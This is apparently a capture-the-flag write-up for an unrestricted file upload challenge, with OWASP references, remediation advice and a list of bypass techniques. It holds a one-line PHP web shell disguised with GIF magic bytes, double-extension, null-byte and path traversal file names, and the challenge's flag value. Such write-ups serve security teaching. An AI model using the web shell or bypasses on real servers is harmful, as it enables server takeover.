## Flag

Create a php file `file.php` add a accepted extension (e.g., `.jpeg`) and upload it via the file upload functionality.

```php
<?php
// file.php
echo "Hello from the uploaded file!";
?>
```

Upload the file to the web application and then access it via the URL:

```bash
curl -s -X POST -F "Upload=Upload" -F "uploaded=@file.php.jpeg;filename=file.php" http://localhost:8080/index.php\?page\=upload | grep flag
# -X POST: Specifies the request method as POST.
# -F "Upload=Upload": Simulates the form submission by including the "Upload" field.
# -F "uploaded=@file.php.jpeg;filename=file.php": Specifies the file to upload, with the correct MIME type and filename.
# @ indicates that the content of the file should be read and sent as the value of the "uploaded" field.
```

```html
<pre><center><h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre>
<pre>/tmp/file.php succesfully uploaded.</pre>
```

We know the file was uploaded successfully because we see the message `/tmp/file.php successfully uploaded.`. Meaning the file is now on the server. So others techniques can be used to access and execute the uploaded file.

## Explanation

https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files
https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html

Unrestricted file upload vulnerabilities occur when a web application allows users to upload files without proper validation and sanitization. This can lead to various security issues, including remote code execution, data breaches, and server compromise.
Usually, attackers exploit these vulnerabilities by uploading malicious files, such as web shells or scripts, that can be executed on the server using another vulnerability (e.g., local file inclusion) to execute the uploaded file.

## Remediation

To prevent unrestricted file upload vulnerabilities, consider the following best practices:

1. **File Type Validation**: Implement strict server-side validation to check the file type, not just the extension. Use a whitelist of allowed file types and verify the file's MIME type and magic bytes.
2. **File Size Limits**: Set limits on the size of uploaded files to prevent denial-of-service attacks.
3. **Storage Location**: Store uploaded files outside the web root directory to prevent direct access and execution.
4. **File Name Sanitization**: Sanitize file names to prevent path traversal attacks and avoid overwriting existing files.
5. **Access Controls**: Implement proper access controls to restrict who can upload files and what types of files they can upload.
6. **Regular Updates**: Keep the server and software up to date with the latest security patches.

---

## Common File Upload Vulnerabilities

### 1. **Insufficient File Type Validation**

- **Weakness**: Only checking file extension
- **Bypass Techniques**:
  - Double extensions: `shell.php.jpeg`, `shell.jpeg.php`
  - Case manipulation: `shell.PhP`, `shell.pHp`
  - Null byte injection: `shell.php%00.jpeg` (older PHP versions)
  - Append valid extension: `shell.php.jpg`

### 2. **MIME Type Manipulation**

- **Weakness**: Trusting client-sent Content-Type headers
- **Bypass**: Modify the Content-Type header in the request
  ```
  Content-Type: image/jpeg  (while uploading .php file)
  ```

### 3. **Magic Bytes/File Signature Bypass**

- **Technique**: Add valid image magic bytes at the beginning
  ```php
  GIF89a;
  <?php system($_GET['cmd']); ?>
  ```
- JPEG magic bytes: `FF D8 FF E0`
- PNG magic bytes: `89 50 4E 47`

### 4. **Path Traversal**

- **Goal**: Upload to unintended directories
- **Technique**: Use filenames like:
  - `../../shell.php`
  - `....//....//shell.php`
